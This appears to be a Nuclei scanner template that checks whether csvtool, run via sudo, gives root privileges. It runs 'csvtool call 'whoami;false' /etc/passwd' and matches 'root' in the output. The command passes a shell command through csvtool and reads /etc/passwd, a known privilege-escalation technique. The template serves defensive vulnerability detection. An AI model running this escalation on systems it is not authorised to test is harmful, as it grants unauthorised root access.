code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'csvtool call ''whoami;false'' /etc/passwd

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo csvtool call ''whoami;false'' /etc/passwd

    '
id: privesc-csvtool
info:
  author: daffainfo
  description: 'csvtool is a command-line utility in Unix-like operating systems that
    provides various tools for working with CSV (Comma-Separated Values) files. It
    can be used to manipulate, process, and analyze CSV data from the command line,
    making it a useful tool for tasks such as data extraction, transformation, and
    loading.

    '
  metadata:
    max-request: 3
    verified: true
  name: csvtool - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/csvtool/
  severity: high
  tags: code,linux,csvtool,privesc,local
self-contained: true
